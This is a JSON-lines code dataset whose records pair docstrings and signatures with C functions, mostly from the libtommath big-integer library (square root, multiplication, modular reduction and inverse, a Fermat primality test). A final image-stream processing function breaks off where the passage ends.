{"docstring": "/* this function is less generic than mp_n_root, simpler and faster */\n", "func_signal": "mp_err mp_sqrt(const mp_int *arg, mp_int *ret)", "code": "{\n   mp_err err;\n   mp_int t1, t2;\n\n   /* must be positive */\n   if (mp_isneg(arg)) {\n      return MP_VAL;\n   }\n\n   /* easy out */\n   if (mp_iszero(arg)) {\n      mp_zero(ret);\n      return MP_OKAY;\n   }\n\n   if ((err = mp_init_copy(&t1, arg)) != MP_OKAY) {\n      return err;\n   }\n\n   if ((err = mp_init(&t2)) != MP_OKAY) {\n      goto LBL_ERR2;\n   }\n\n   /* First approx. (not very bad for large arg) */\n   mp_rshd(&t1, t1.used/2);\n\n   /* t1 > 0  */\n   if ((err = mp_div(arg, &t1, &t2, NULL)) != MP_OKAY) {\n      goto LBL_ERR1;\n   }\n   if ((err = mp_add(&t1, &t2, &t1)) != MP_OKAY) {\n      goto LBL_ERR1;\n   }\n   if ((err = mp_div_2(&t1, &t1)) != MP_OKAY) {\n      goto LBL_ERR1;\n   }\n   /* And now t1 > sqrt(arg) */\n   do {\n      if ((err = mp_div(arg, &t1, &t2, NULL)) != MP_OKAY) {\n         goto LBL_ERR1;\n      }\n      if ((err = mp_add(&t1, &t2, &t1)) != MP_OKAY) {\n         goto LBL_ERR1;\n      }\n      if ((err = mp_div_2(&t1, &t1)) != MP_OKAY) {\n         goto LBL_ERR1;\n      }\n      /* t1 >= sqrt(arg) >= t2 at this point */\n   } while (mp_cmp_mag(&t1, &t2) == MP_GT);\n\n   mp_exch(&t1, ret);\n\nLBL_ERR1:\n   mp_clear(&t2);\nLBL_ERR2:\n   mp_clear(&t1);\n   return err;\n}", "path": "libtommath/mp_sqrt.c", "commit_date": "2019-11-11 00:00:00", "repo_name": "libtom/libtommath", "stars": 622, "license": "other", "language": "c", "size": 21608}
{"docstring": "/* determines if reduce_2k_l can be used */\n", "func_signal": "bool mp_reduce_is_2k_l(const mp_int *a)", "code": "{\n   if (mp_iszero(a)) {\n      return false;\n   } else if (a->used == 1) {\n      return true;\n   } else if (a->used > 1) {\n      /* if more than half of the digits are -1 we're sold */\n      int ix, iy;\n      for (iy = ix = 0; ix < a->used; ix++) {\n         if (a->dp[ix] == MP_DIGIT_MAX) {\n            ++iy;\n         }\n      }\n      return (iy >= (a->used/2));\n   } else {\n      return false;\n   }\n}", "path": "libtommath/mp_reduce_is_2k_l.c", "commit_date": "2019-11-11 00:00:00", "repo_name": "libtom/libtommath", "stars": 622, "license": "other", "language": "c", "size": 21608}
{"docstring": "/* high level multiplication (handles sign) */\n", "func_signal": "mp_err mp_mul(const mp_int *a, const mp_int *b, mp_int *c)", "code": "{\n   mp_err err;\n   int min = MP_MIN(a->used, b->used),\n       max = MP_MAX(a->used, b->used),\n       digs = a->used + b->used + 1;\n   bool neg = (a->sign != b->sign);\n\n   if ((a == b) &&\n       MP_HAS(S_MP_SQR_TOOM) && /* use Toom-Cook? */\n       (a->used >= MP_SQR_TOOM_CUTOFF)) {\n      err = s_mp_sqr_toom(a, c);\n   } else if ((a == b) &&\n              MP_HAS(S_MP_SQR_KARATSUBA) &&  /* Karatsuba? */\n              (a->used >= MP_SQR_KARATSUBA_CUTOFF)) {\n      err = s_mp_sqr_karatsuba(a, c);\n   } else if ((a == b) &&\n              MP_HAS(S_MP_SQR_COMBA) && /* can we use the fast comba multiplier? */\n              (((a->used * 2) + 1) < MP_WARRAY) &&\n              (a->used < (MP_MAX_COMBA / 2))) {\n      err = s_mp_sqr_comba(a, c);\n   } else if ((a == b) &&\n              MP_HAS(S_MP_SQR)) {\n      err = s_mp_sqr(a, c);\n   } else if (MP_HAS(S_MP_MUL_BALANCE) &&\n              /* Check sizes. The smaller one needs to be larger than the Karatsuba cut-off.\n               * The bigger one needs to be at least about one MP_MUL_KARATSUBA_CUTOFF bigger\n               * to make some sense, but it depends on architecture, OS, position of the\n               * stars... so YMMV.\n               * Using it to cut the input into slices small enough for s_mp_mul_comba\n               * was actually slower on the author's machine, but YMMV.\n               */\n              (min >= MP_MUL_KARATSUBA_CUTOFF) &&\n              ((max / 2) >= MP_MUL_KARATSUBA_CUTOFF) &&\n              /* Not much effect was observed below a ratio of 1:2, but again: YMMV. */\n              (max >= (2 * min))) {\n      err = s_mp_mul_balance(a,b,c);\n   } else if (MP_HAS(S_MP_MUL_TOOM) &&\n              (min >= MP_MUL_TOOM_CUTOFF)) {\n      err = s_mp_mul_toom(a, b, c);\n   } else if (MP_HAS(S_MP_MUL_KARATSUBA) &&\n              (min >= MP_MUL_KARATSUBA_CUTOFF)) {\n      err = s_mp_mul_karatsuba(a, b, c);\n   } else if (MP_HAS(S_MP_MUL_COMBA) &&\n              /* can we use the fast multiplier?\n               *\n               * The fast multiplier can be used if the output will\n               * have less than MP_WARRAY digits and the number of\n               * digits won't affect carry propagation\n               */\n              (digs < MP_WARRAY) &&\n              (min <= MP_MAX_COMBA)) {\n      err = s_mp_mul_comba(a, b, c, digs);\n   } else if (MP_HAS(S_MP_MUL)) {\n      err = s_mp_mul(a, b, c, digs);\n   } else {\n      err = MP_VAL;\n   }\n   c->sign = ((c->used > 0) && neg) ? MP_NEG : MP_ZPOS;\n   return err;\n}", "path": "libtommath/mp_mul.c", "commit_date": "2019-11-11 00:00:00", "repo_name": "libtom/libtommath", "stars": 622, "license": "other", "language": "c", "size": 21608}
{"docstring": "/* stripped down version of mp_radix_size. The faster version can be off by up t\no +3  */\n", "func_signal": "static mp_err s_rs(const mp_int *a, int radix, int *size)", "code": "{\n   mp_err res;\n   int digs = 0u;\n   mp_int  t;\n   mp_digit d;\n   *size = 0u;\n   if (mp_iszero(a)) {\n      *size = 2u;\n      return MP_OKAY;\n   }\n   if (radix == 2) {\n      *size = mp_count_bits(a) + 1;\n      return MP_OKAY;\n   }\n   DO_WHAT(mp_init_copy(&t, a), return MP_ERR);\n   t.sign = MP_ZPOS;\n   while (!mp_iszero(&t)) {\n      if ((res = mp_div_d(&t, (mp_digit)radix, &t, &d)) != MP_OKAY) {\n         mp_clear(&t);\n         return res;\n      }\n      ++digs;\n   }\n   mp_clear(&t);\n   *size = digs + 1;\n   return MP_OKAY;\n}", "path": "libtommath/demo/test.c", "commit_date": "2020-09-20 00:00:00", "repo_name": "libtom/libtommath", "stars": 622, "license": "other", "language": "c", "size": 21608}
{"docstring": "/* Some larger values to test the fast division algorithm */\n", "func_signal": "static int test_s_mp_div_recursive(void)", "code": "{\n   mp_int a, b, c_q, c_r, d_q, d_r;\n   int size;\n\n   DOR(mp_init_multi(&a, &b, &c_q, &c_r, &d_q, &d_r, NULL));\n\n   for (size = MP_MUL_KARATSUBA_CUTOFF; size < (3 * MP_MUL_KARATSUBA_CUTOFF); size += 10) {\n      printf(\"\\rsizes = %d / %d\", 10 * size, size);\n      /* Relation 10:1 */\n      DO(mp_rand(&a, 10 * size));\n      DO(mp_rand(&b, size));\n      DO(s_mp_div_recursive(&a, &b, &c_q, &c_r));\n      DO(s_mp_div_school(&a, &b, &d_q, &d_r));\n      EXPECT(mp_cmp(&c_q, &d_q) == MP_EQ);\n      EXPECT(mp_cmp(&c_r, &d_r) == MP_EQ);\n      printf(\"\\rsizes = %d / %d\", 2 * size, size);\n\n      /* Relation 10:1 negative numerator*/\n      DO(mp_rand(&a, 10 * size));\n      DO(mp_neg(&a, &a));\n      DO(mp_rand(&b, size));\n      DO(s_mp_div_recursive(&a, &b, &c_q, &c_r));\n      DO(s_mp_div_school(&a, &b, &d_q, &d_r));\n      EXPECT(mp_cmp(&c_q, &d_q) == MP_EQ);\n      EXPECT(mp_cmp(&c_r, &d_r) == MP_EQ);\n      printf(\"\\rsizes = %d / %d, negative numerator\", 2 * size, size);\n\n      /* Relation 10:1 negative denominator*/\n      DO(mp_rand(&a, 10 * size));\n      DO(mp_rand(&b, size));\n      DO(mp_neg(&b, &b));\n      DO(s_mp_div_recursive(&a, &b, &c_q, &c_r));\n      DO(s_mp_div_school(&a, &b, &d_q, &d_r));\n      EXPECT(mp_cmp(&c_q, &d_q) == MP_EQ);\n      EXPECT(mp_cmp(&c_r, &d_r) == MP_EQ);\n      printf(\"\\rsizes = %d / %d, negative denominator\", 2 * size, size);\n\n      /* Relation 2:1 */\n      DO(mp_rand(&a, 2 * size));\n      DO(mp_rand(&b, size));\n      DO(s_mp_div_recursive(&a, &b, &c_q, &c_r));\n      DO(s_mp_div_school(&a, &b, &d_q, &d_r));\n      EXPECT(mp_cmp(&c_q, &d_q) == MP_EQ);\n      EXPECT(mp_cmp(&c_r, &d_r) == MP_EQ);\n      printf(\"\\rsizes = %d / %d\", 3 * size, 2 * size);\n      /* Upper limit 3:2 */\n      DO(mp_rand(&a, 3 * size));\n      DO(mp_rand(&b, 2 * size));\n      DO(s_mp_div_recursive(&a, &b, &c_q, &c_r));\n      DO(s_mp_div_school(&a, &b, &d_q, &d_r));\n      EXPECT(mp_cmp(&c_q, &d_q) == MP_EQ);\n      EXPECT(mp_cmp(&c_r, &d_r) == MP_EQ);\n   }\n\n   mp_clear_multi(&a, &b, &c_q, &c_r, &d_q, &d_r, NULL);\n   return EXIT_SUCCESS;\nLBL_ERR:\n   mp_clear_multi(&a, &b, &c_q, &c_r, &d_q, &d_r, NULL);\n   return EXIT_FAILURE;\n}", "path": "libtommath/demo/test.c", "commit_date": "2020-09-20 00:00:00", "repo_name": "libtom/libtommath", "stars": 622, "license": "other", "language": "c", "size": 21608}
{"docstring": "/* set to zero */\n", "func_signal": "void mp_zero(mp_int *a)", "code": "{\n   a->sign = MP_ZPOS;\n   s_mp_zero_digs(a->dp, a->used);\n   a->used = 0;\n}", "path": "libtommath/mp_zero.c", "commit_date": "2019-11-04 00:00:00", "repo_name": "libtom/libtommath", "stars": 622, "license": "other", "language": "c", "size": 21608}
{"docstring": "/* set to a digit */\n", "func_signal": "void mp_set(mp_int *a, mp_digit b)", "code": "{\n   int oldused = a->used;\n   a->dp[0] = b & MP_MASK;\n   a->sign  = MP_ZPOS;\n   a->used  = (a->dp[0] != 0u) ? 1 : 0;\n   s_mp_zero_digs(a->dp + a->used, oldused - a->used);\n}", "path": "libtommath/mp_set.c", "commit_date": "2019-11-04 00:00:00", "repo_name": "libtom/libtommath", "stars": 622, "license": "other", "language": "c", "size": 21608}
{"docstring": "/* reduces x mod m, assumes 0 < x < m**2, mu is\n * precomputed via mp_reduce_setup.\n * From HAC pp.604 Algorithm 14.42\n */\n", "func_signal": "mp_err mp_reduce(mp_int *x, const mp_int *m, const mp_int *mu)", "code": "{\n   mp_int  q;\n   mp_err  err;\n   int     um = m->used;\n\n   /* q = x */\n   if ((err = mp_init_copy(&q, x)) != MP_OKAY) {\n      return err;\n   }\n\n   /* q1 = x / b**(k-1)  */\n   mp_rshd(&q, um - 1);\n\n   /* according to HAC this optimization is ok */\n   if ((mp_digit)um > ((mp_digit)1 << (MP_DIGIT_BIT - 1))) {\n      if ((err = mp_mul(&q, mu, &q)) != MP_OKAY) {\n         goto LBL_ERR;\n      }\n   } else if (MP_HAS(S_MP_MUL_HIGH)) {\n      if ((err = s_mp_mul_high(&q, mu, &q, um)) != MP_OKAY) {\n         goto LBL_ERR;\n      }\n   } else if (MP_HAS(S_MP_MUL_HIGH_COMBA)) {\n      if ((err = s_mp_mul_high_comba(&q, mu, &q, um)) != MP_OKAY) {\n         goto LBL_ERR;\n      }\n   } else {\n      err = MP_VAL;\n      goto LBL_ERR;\n   }\n\n   /* q3 = q2 / b**(k+1) */\n   mp_rshd(&q, um + 1);\n\n   /* x = x mod b**(k+1), quick (no division) */\n   if ((err = mp_mod_2d(x, MP_DIGIT_BIT * (um + 1), x)) != MP_OKAY) {\n      goto LBL_ERR;\n   }\n\n   /* q = q * m mod b**(k+1), quick (no division) */\n   if ((err = s_mp_mul(&q, m, &q, um + 1)) != MP_OKAY) {\n      goto LBL_ERR;\n   }\n\n   /* x = x - q */\n   if ((err = mp_sub(x, &q, x)) != MP_OKAY) {\n      goto LBL_ERR;\n   }\n\n   /* If x < 0, add b**(k+1) to it */\n   if (mp_cmp_d(x, 0uL) == MP_LT) {\n      mp_set(&q, 1uL);\n      if ((err = mp_lshd(&q, um + 1)) != MP_OKAY) {\n         goto LBL_ERR;\n      }\n      if ((err = mp_add(x, &q, x)) != MP_OKAY) {\n         goto LBL_ERR;\n      }\n   }\n\n   /* Back off if it's too big */\n   while (mp_cmp(x, m) != MP_LT) {\n      if ((err = s_mp_sub(x, m, x)) != MP_OKAY) {\n         goto LBL_ERR;\n      }\n   }\n\nLBL_ERR:\n   mp_clear(&q);\n\n   return err;\n}", "path": "libtommath/mp_reduce.c", "commit_date": "2019-11-04 00:00:00", "repo_name": "libtom/libtommath", "stars": 622, "license": "other", "language": "c", "size": 21608}
{"docstring": "/* init a new mp_int */\n", "func_signal": "mp_err mp_init(mp_int *a)", "code": "{\n   /* allocate memory required and clear it */\n   a->dp = (mp_digit *) MP_CALLOC((size_t)MP_DEFAULT_DIGIT_COUNT, sizeof(mp_digit));\n   if (a->dp == NULL) {\n      return MP_MEM;\n   }\n\n   /* set the used to zero, allocated digits to the default precision\n    * and sign to positive */\n   a->used  = 0;\n   a->alloc = MP_DEFAULT_DIGIT_COUNT;\n   a->sign  = MP_ZPOS;\n\n   return MP_OKAY;\n}", "path": "libtommath/mp_init.c", "commit_date": "2019-12-05 00:00:00", "repo_name": "libtom/libtommath", "stars": 622, "license": "other", "language": "c", "size": 21608}
{"docstring": "/* low level squaring, b = a*a, HAC pp.596-597, Algorithm 14.16 */\n", "func_signal": "mp_err s_mp_sqr(const mp_int *a, mp_int *b)", "code": "{\n   mp_int   t;\n   int      ix, pa;\n   mp_err   err;\n\n   pa = a->used;\n   if ((err = mp_init_size(&t, (2 * pa) + 1)) != MP_OKAY) {\n      return err;\n   }\n\n   /* default used is maximum possible size */\n   t.used = (2 * pa) + 1;\n\n   for (ix = 0; ix < pa; ix++) {\n      mp_digit u;\n      int iy;\n\n      /* first calculate the digit at 2*ix */\n      /* calculate double precision result */\n      mp_word r = (mp_word)t.dp[2*ix] +\n                  ((mp_word)a->dp[ix] * (mp_word)a->dp[ix]);\n\n      /* store lower part in result */\n      t.dp[ix+ix] = (mp_digit)(r & (mp_word)MP_MASK);\n\n      /* get the carry */\n      u           = (mp_digit)(r >> (mp_word)MP_DIGIT_BIT);\n\n      for (iy = ix + 1; iy < pa; iy++) {\n         /* first calculate the product */\n         r       = (mp_word)a->dp[ix] * (mp_word)a->dp[iy];\n\n         /* now calculate the double precision result, note we use\n          * addition instead of *2 since it's easier to optimize\n          */\n         r       = (mp_word)t.dp[ix + iy] + r + r + (mp_word)u;\n\n         /* store lower part */\n         t.dp[ix + iy] = (mp_digit)(r & (mp_word)MP_MASK);\n\n         /* get carry */\n         u       = (mp_digit)(r >> (mp_word)MP_DIGIT_BIT);\n      }\n      /* propagate upwards */\n      while (u != 0uL) {\n         r       = (mp_word)t.dp[ix + iy] + (mp_word)u;\n         t.dp[ix + iy] = (mp_digit)(r & (mp_word)MP_MASK);\n         u       = (mp_digit)(r >> (mp_word)MP_DIGIT_BIT);\n         ++iy;\n      }\n   }\n\n   mp_clamp(&t);\n   mp_exch(&t, b);\n   mp_clear(&t);\n   return MP_OKAY;\n}", "path": "libtommath/s_mp_sqr.c", "commit_date": "2019-11-04 00:00:00", "repo_name": "libtom/libtommath", "stars": 622, "license": "other", "language": "c", "size": 21608}
{"docstring": "/* computes the modular inverse via binary extended euclidean algorithm,\n * that is c = 1/a mod b\n *\n * Based on slow invmod except this is optimized for the case where b is\n * odd as per HAC Note 14.64 on pp. 610\n */\n", "func_signal": "mp_err s_mp_invmod_odd(const mp_int *a, const mp_int *b, mp_int *c)", "code": "{\n   mp_int  x, y, u, v, B, D;\n   mp_sign sign;\n   mp_err  err;\n\n   /* 2. [modified] b must be odd   */\n   if (mp_iseven(b)) {\n      return MP_VAL;\n   }\n\n   /* init all our temps */\n   if ((err = mp_init_multi(&x, &y, &u, &v, &B, &D, NULL)) != MP_OKAY) {\n      return err;\n   }\n\n   /* x == modulus, y == value to invert */\n   if ((err = mp_copy(b, &x)) != MP_OKAY)                         goto LBL_ERR;\n\n   /* we need y = |a| */\n   if ((err = mp_mod(a, b, &y)) != MP_OKAY)                       goto LBL_ERR;\n\n   /* if one of x,y is zero return an error! */\n   if (mp_iszero(&x) || mp_iszero(&y)) {\n      err = MP_VAL;\n      goto LBL_ERR;\n   }\n\n   /* 3. u=x, v=y, A=1, B=0, C=0,D=1 */\n   if ((err = mp_copy(&x, &u)) != MP_OKAY)                        goto LBL_ERR;\n   if ((err = mp_copy(&y, &v)) != MP_OKAY)                        goto LBL_ERR;\n   mp_set(&D, 1uL);\n\n   do {\n      /* 4.  while u is even do */\n      while (mp_iseven(&u)) {\n         /* 4.1 u = u/2 */\n         if ((err = mp_div_2(&u, &u)) != MP_OKAY)                    goto LBL_ERR;\n\n         /* 4.2 if B is odd then */\n         if (mp_isodd(&B)) {\n            if ((err = mp_sub(&B, &x, &B)) != MP_OKAY)               goto LBL_ERR;\n         }\n         /* B = B/2 */\n         if ((err = mp_div_2(&B, &B)) != MP_OKAY)                    goto LBL_ERR;\n      }\n\n      /* 5.  while v is even do */\n      while (mp_iseven(&v)) {\n         /* 5.1 v = v/2 */\n         if ((err = mp_div_2(&v, &v)) != MP_OKAY)                    goto LBL_ERR;\n\n         /* 5.2 if D is odd then */\n         if (mp_isodd(&D)) {\n            /* D = (D-x)/2 */\n            if ((err = mp_sub(&D, &x, &D)) != MP_OKAY)               goto LBL_ERR;\n         }\n         /* D = D/2 */\n         if ((err = mp_div_2(&D, &D)) != MP_OKAY)                    goto LBL_ERR;\n      }\n\n      /* 6.  if u >= v then */\n      if (mp_cmp(&u, &v) != MP_LT) {\n         /* u = u - v, B = B - D */\n         if ((err = mp_sub(&u, &v, &u)) != MP_OKAY)                  goto LBL_ERR;\n\n         if ((err = mp_sub(&B, &D, &B)) != MP_OKAY)                  goto LBL_ERR;\n      } else {\n         /* v - v - u, D = D - B */\n         if ((err = mp_sub(&v, &u, &v)) != MP_OKAY)                  goto LBL_ERR;\n\n         if ((err = mp_sub(&D, &B, &D)) != MP_OKAY)                  goto LBL_ERR;\n      }\n\n      /* if not zero goto step 4 */\n   } while (!mp_iszero(&u));\n\n   /* now a = C, b = D, gcd == g*v */\n\n   /* if v != 1 then there is no inverse */\n   if (mp_cmp_d(&v, 1uL) != MP_EQ) {\n      err = MP_VAL;\n      goto LBL_ERR;\n   }\n\n   /* b is now the inverse */\n   sign = a->sign;\n   while (mp_isneg(&D)) {\n      if ((err = mp_add(&D, b, &D)) != MP_OKAY)                   goto LBL_ERR;\n   }\n\n   /* too big */\n   while (mp_cmp_mag(&D, b) != MP_LT) {\n      if ((err = mp_sub(&D, b, &D)) != MP_OKAY)                   goto LBL_ERR;\n   }\n\n   mp_exch(&D, c);\n   c->sign = sign;\n   err = MP_OKAY;\n\nLBL_ERR:\n   mp_clear_multi(&x, &y, &u, &v, &B, &D, NULL);\n   return err;\n}", "path": "libtommath/s_mp_invmod_odd.c", "commit_date": "2019-11-11 00:00:00", "repo_name": "libtom/libtommath", "stars": 622, "license": "other", "language": "c", "size": 21608}
{"docstring": "/* the jist of squaring...\n * you do like mult except the offset of the tmpx [one that\n * starts closer to zero] can't equal the offset of tmpy.\n * So basically you set up iy like before then you min it with\n * (ty-tx) so that it never happens.  You double all those\n * you add in the inner loop\n\nAfter that loop you do the squares and add them in.\n*/\n", "func_signal": "mp_err s_mp_sqr_comba(const mp_int *a, mp_int *b)", "code": "{\n   int       oldused, pa, ix;\n   mp_digit  W[MP_WARRAY];\n   mp_word   W1;\n   mp_err err;\n\n   /* grow the destination as required */\n   pa = a->used + a->used;\n   if ((err = mp_grow(b, pa)) != MP_OKAY) {\n      return err;\n   }\n\n   /* number of output digits to produce */\n   W1 = 0;\n   for (ix = 0; ix < pa; ix++) {\n      int      tx, ty, iy, iz;\n      mp_word  _W;\n\n      /* clear counter */\n      _W = 0;\n\n      /* get offsets into the two bignums */\n      ty = MP_MIN(a->used-1, ix);\n      tx = ix - ty;\n\n      /* this is the number of times the loop will iterrate, essentially\n         while (tx++ < a->used && ty-- >= 0) { ... }\n       */\n      iy = MP_MIN(a->used-tx, ty+1);\n\n      /* now for squaring tx can never equal ty\n       * we halve the distance since they approach at a rate of 2x\n       * and we have to round because odd cases need to be executed\n       */\n      iy = MP_MIN(iy, ((ty-tx)+1)>>1);\n\n      /* execute loop */\n      for (iz = 0; iz < iy; iz++) {\n         _W += (mp_word)a->dp[tx + iz] * (mp_word)a->dp[ty - iz];\n      }\n\n      /* double the inner product and add carry */\n      _W = _W + _W + W1;\n\n      /* even columns have the square term in them */\n      if (((unsigned)ix & 1u) == 0u) {\n         _W += (mp_word)a->dp[ix>>1] * (mp_word)a->dp[ix>>1];\n      }\n\n      /* store it */\n      W[ix] = (mp_digit)_W & MP_MASK;\n\n      /* make next carry */\n      W1 = _W >> (mp_word)MP_DIGIT_BIT;\n   }\n\n   /* setup dest */\n   oldused  = b->used;\n   b->used = a->used+a->used;\n\n   for (ix = 0; ix < pa; ix++) {\n      b->dp[ix] = W[ix] & MP_MASK;\n   }\n\n   /* clear unused digits [that existed in the old copy of c] */\n   s_mp_zero_digs(b->dp + b->used, oldused - b->used);\n\n   mp_clamp(b);\n   return MP_OKAY;\n}", "path": "libtommath/s_mp_sqr_comba.c", "commit_date": "2019-11-04 00:00:00", "repo_name": "libtom/libtommath", "stars": 622, "license": "other", "language": "c", "size": 21608}
{"docstring": "/* Get bit at position b and return true if the bit is 1, false if it is 0 */\n", "func_signal": "bool s_mp_get_bit(const mp_int *a, int b)", "code": "{\n   mp_digit bit;\n   int limb = b / MP_DIGIT_BIT;\n\n   if (limb < 0 || limb >= a->used) {\n      return false;\n   }\n\n   bit = (mp_digit)1 << (b % MP_DIGIT_BIT);\n   return ((a->dp[limb] & bit) != 0u);\n}", "path": "libtommath/s_mp_get_bit.c", "commit_date": "2019-11-04 00:00:00", "repo_name": "libtom/libtommath", "stars": 622, "license": "other", "language": "c", "size": 21608}
{"docstring": "/* reduces a modulo n where n is of the form 2**p - d */\n", "func_signal": "mp_err mp_reduce_2k(mp_int *a, const mp_int *n, mp_digit d)", "code": "{\n   mp_int q;\n   mp_err err;\n   int p;\n\n   if ((err = mp_init(&q)) != MP_OKAY) {\n      return err;\n   }\n\n   p = mp_count_bits(n);\n   for (;;) {\n      /* q = a/2**p, a = a mod 2**p */\n      if ((err = mp_div_2d(a, p, &q, a)) != MP_OKAY) {\n         goto LBL_ERR;\n      }\n\n      if (d != 1u) {\n         /* q = q * d */\n         if ((err = mp_mul_d(&q, d, &q)) != MP_OKAY) {\n            goto LBL_ERR;\n         }\n      }\n\n      /* a = a + q */\n      if ((err = s_mp_add(a, &q, a)) != MP_OKAY) {\n         goto LBL_ERR;\n      }\n\n      if (mp_cmp_mag(a, n) == MP_LT) {\n         break;\n      }\n      if ((err = s_mp_sub(a, n, a)) != MP_OKAY) {\n         goto LBL_ERR;\n      }\n   }\n\nLBL_ERR:\n   mp_clear(&q);\n   return err;\n}", "path": "libtommath/mp_reduce_2k.c", "commit_date": "2019-11-04 00:00:00", "repo_name": "libtom/libtommath", "stars": 622, "license": "other", "language": "c", "size": 21608}
{"docstring": "/* Karatsuba squaring, computes b = a*a using three\n * half size squarings\n *\n * See comments of mul_karatsuba for details.  It\n * is essentially the same algorithm but merely\n * tuned to perform recursive squarings.\n */\n", "func_signal": "mp_err s_mp_sqr_karatsuba(const mp_int *a, mp_int *b)", "code": "{\n   mp_int  x0, x1, t1, t2, x0x0, x1x1;\n   int B;\n   mp_err  err;\n\n   /* min # of digits */\n   B = a->used;\n\n   /* now divide in two */\n   B = B >> 1;\n\n   /* init copy all the temps */\n   if ((err = mp_init_size(&x0, B)) != MP_OKAY)\n      goto LBL_ERR;\n   if ((err = mp_init_size(&x1, a->used - B)) != MP_OKAY)\n      goto X0;\n\n   /* init temps */\n   if ((err = mp_init_size(&t1, a->used * 2)) != MP_OKAY)\n      goto X1;\n   if ((err = mp_init_size(&t2, a->used * 2)) != MP_OKAY)\n      goto T1;\n   if ((err = mp_init_size(&x0x0, B * 2)) != MP_OKAY)\n      goto T2;\n   if ((err = mp_init_size(&x1x1, (a->used - B) * 2)) != MP_OKAY)\n      goto X0X0;\n\n   /* now shift the digits */\n   x0.used = B;\n   x1.used = a->used - B;\n   s_mp_copy_digs(x0.dp, a->dp, x0.used);\n   s_mp_copy_digs(x1.dp, a->dp + B, x1.used);\n   mp_clamp(&x0);\n\n   /* now calc the products x0*x0 and x1*x1 */\n   if ((err = mp_sqr(&x0, &x0x0)) != MP_OKAY)\n      goto X1X1;           /* x0x0 = x0*x0 */\n   if ((err = mp_sqr(&x1, &x1x1)) != MP_OKAY)\n      goto X1X1;           /* x1x1 = x1*x1 */\n\n   /* now calc (x1+x0)**2 */\n   if ((err = s_mp_add(&x1, &x0, &t1)) != MP_OKAY)\n      goto X1X1;           /* t1 = x1 - x0 */\n   if ((err = mp_sqr(&t1, &t1)) != MP_OKAY)\n      goto X1X1;           /* t1 = (x1 - x0) * (x1 - x0) */\n\n   /* add x0y0 */\n   if ((err = s_mp_add(&x0x0, &x1x1, &t2)) != MP_OKAY)\n      goto X1X1;           /* t2 = x0x0 + x1x1 */\n   if ((err = s_mp_sub(&t1, &t2, &t1)) != MP_OKAY)\n      goto X1X1;           /* t1 = (x1+x0)**2 - (x0x0 + x1x1) */\n\n   /* shift by B */\n   if ((err = mp_lshd(&t1, B)) != MP_OKAY)\n      goto X1X1;           /* t1 = (x0x0 + x1x1 - (x1-x0)*(x1-x0))<<B */\n   if ((err = mp_lshd(&x1x1, B * 2)) != MP_OKAY)\n      goto X1X1;           /* x1x1 = x1x1 << 2*B */\n\n   if ((err = mp_add(&x0x0, &t1, &t1)) != MP_OKAY)\n      goto X1X1;           /* t1 = x0x0 + t1 */\n   if ((err = mp_add(&t1, &x1x1, b)) != MP_OKAY)\n      goto X1X1;           /* t1 = x0x0 + t1 + x1x1 */\n\nX1X1:\n   mp_clear(&x1x1);\nX0X0:\n   mp_clear(&x0x0);\nT2:\n   mp_clear(&t2);\nT1:\n   mp_clear(&t1);\nX1:\n   mp_clear(&x1);\nX0:\n   mp_clear(&x0);\nLBL_ERR:\n   return err;\n}", "path": "libtommath/s_mp_sqr_karatsuba.c", "commit_date": "2019-11-04 00:00:00", "repo_name": "libtom/libtommath", "stars": 622, "license": "other", "language": "c", "size": 21608}
{"docstring": "/* performs one Fermat test.\n *\n * If \"a\" were prime then b**a == b (mod a) since the order of\n * the multiplicative sub-group would be phi(a) = a-1.  That means\n * it would be the same as b**(a mod (a-1)) == b**1 == b (mod a).\n *\n * Sets result to 1 if the congruence holds, or zero otherwise.\n */\n", "func_signal": "mp_err mp_prime_fermat(const mp_int *a, const mp_int *b, bool *result)", "code": "{\n   mp_int  t;\n   mp_err  err;\n\n   /* ensure b > 1 */\n   if (mp_cmp_d(b, 1uL) != MP_GT) {\n      return MP_VAL;\n   }\n\n   /* init t */\n   if ((err = mp_init(&t)) != MP_OKAY) {\n      return err;\n   }\n\n   /* compute t = b**a mod a */\n   if ((err = mp_exptmod(b, a, a, &t)) != MP_OKAY) {\n      goto LBL_ERR;\n   }\n\n   /* is it equal to b? */\n   *result = mp_cmp(&t, b) == MP_EQ;\n\nLBL_ERR:\n   mp_clear(&t);\n   return err;\n}", "path": "libtommath/mp_prime_fermat.c", "commit_date": "2019-11-04 00:00:00", "repo_name": "libtom/libtommath", "stars": 622, "license": "other", "language": "c", "size": 21608}
{"docstring": "/* calculate c = a**b  using a square-multiply algorithm */\n", "func_signal": "mp_err mp_expt_n(const mp_int *a, int b, mp_int *c)", "code": "{\n   mp_err err;\n   mp_int  g;\n\n   if ((err = mp_init_copy(&g, a)) != MP_OKAY) {\n      return err;\n   }\n\n   /* set initial result */\n   mp_set(c, 1uL);\n\n   while (b > 0) {\n      /* if the bit is set multiply */\n      if ((b & 1) != 0) {\n         if ((err = mp_mul(c, &g, c)) != MP_OKAY) {\n            goto LBL_ERR;\n         }\n      }\n\n      /* square */\n      if (b > 1) {\n         if ((err = mp_sqr(&g, &g)) != MP_OKAY) {\n            goto LBL_ERR;\n         }\n      }\n\n      /* shift to next bit */\n      b >>= 1;\n   }\n\nLBL_ERR:\n   mp_clear(&g);\n   return err;\n}", "path": "libtommath/mp_expt_n.c", "commit_date": "2019-11-14 00:00:00", "repo_name": "libtom/libtommath", "stars": 622, "license": "other", "language": "c", "size": 21608}
{"docstring": "/* Process a buffer. */\n", "func_signal": "private int\ns_image_colors_process(stream_state * st, stream_cursor_read * pr,\n\t     stream_cursor_write * pw, bool last)", "code": "{\n    stream_image_colors_state *const ss = (stream_image_colors_state *) st;\n\n    for (;;) {\n\tif (pw->ptr >= pw->limit)\n\t    return 1;\n\tif (ss->row_bits_passed >= ss->row_bits) {\n\t    ss->row_alignment_bytes_left = ss->row_alignment_bytes;\n\t    ss->input_bits_buffered = 0;\n\t    ss->input_bits_buffer = 0; /* Just to simplify the debugging. */\n\t    if (ss->output_bits_buffered) {\n\t\t*(++pw->ptr) = ss->output_bits_buffer;\n\t\tss->output_bits_buffered = 0;\n\t\tss->output_bits_buffer = 0;\n\t    }\n\t    ss->row_bits_passed = 0;\n\t    continue;\n\t}\n\tif (ss->row_alignment_bytes_left) {\n\t    uint k = pr->limit - pr->ptr;\n\n\t    if (k > ss->row_alignment_bytes_left)\n\t\tk = ss->row_alignment_bytes_left;\n\t    pr->ptr += k;\n\t    ss->row_alignment_bytes_left -= k;\n\t    if (pr->ptr >= pr->limit)\n\t\treturn 0;\n\t}\n\tif (ss->output_component_index < ss->output_depth) {\n\t    for (;ss->output_component_index < 